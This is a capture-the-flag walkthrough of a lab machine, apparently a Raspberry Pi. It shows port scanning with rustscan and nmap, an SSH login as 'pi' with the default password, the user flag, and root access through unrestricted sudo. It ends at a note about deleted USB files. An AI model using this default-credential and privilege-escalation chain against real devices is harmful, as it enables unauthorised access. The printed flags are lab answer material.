## STEP 1
```sh
└─$ rustscan -a 10.129.159.64 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.159.64:22
Open 10.129.159.64:53
Open 10.129.159.64:80
Open 10.129.159.64:32400
Open 10.129.159.64:32469
10.129.159.64 -> [22,53,80,32400,32469]
```
```sh
└─$ nmap -n -Pn -p32400,32469 10.129.159.64                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 08:09 EDT
Nmap scan report for 10.129.159.64
Host is up (0.34s latency).

PORT      STATE SERVICE
32400/tcp open  plex
32469/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
```


## STEP 2
```sh
└─$ ssh pi@10.129.159.64 
The authenticity of host '10.129.159.64 (10.129.159.64)' can't be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.159.64' (ED25519) to the list of known hosts.
pi@10.129.159.64's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ cat /home/pi/Desktop/user.txt 
ff837707441b257a20e32199d7c8838d
```


## STEP 3
```
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

pi@raspberrypi:~ $ sudo su

root@raspberrypi:/home/pi# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```
```sh
root@raspberrypi:~# df -T
Filesystem     Type     1K-blocks    Used Available Use% Mounted on
aufs           aufs       8856504 2836172   5547400  34% /
tmpfs          tmpfs       102396    4884     97512   5% /run
/dev/sda1      iso9660    1354528 1354528         0 100% /lib/live/mount/persistence/sda1
/dev/loop0     squashfs   1267456 1267456         0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs          tmpfs       255988       0    255988   0% /lib/live/mount/overlay
/dev/sda2      ext4       8856504 2836172   5547400  34% /lib/live/mount/persistence/sda2
devtmpfs       devtmpfs     10240       0     10240   0% /dev
tmpfs          tmpfs       255988       8    255980   1% /dev/shm
tmpfs          tmpfs         5120       4      5116   1% /run/lock
tmpfs          tmpfs       255988       0    255988   0% /sys/fs/cgroup
tmpfs          tmpfs       255988       8    255980   1% /tmp
/dev/sdb       ext4          8887      93      8078   2% /media/usbstick
tmpfs          tmpfs        51200       0     51200   0% /run/user/999
tmpfs          tmpfs        51200       0     51200   0% /run/user/1000

root@raspberrypi:/home/pi# ls /media/usbstick/
damnit.txt  lost+found

root@raspberrypi:/home/pi# cat /media/usbstick/damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```
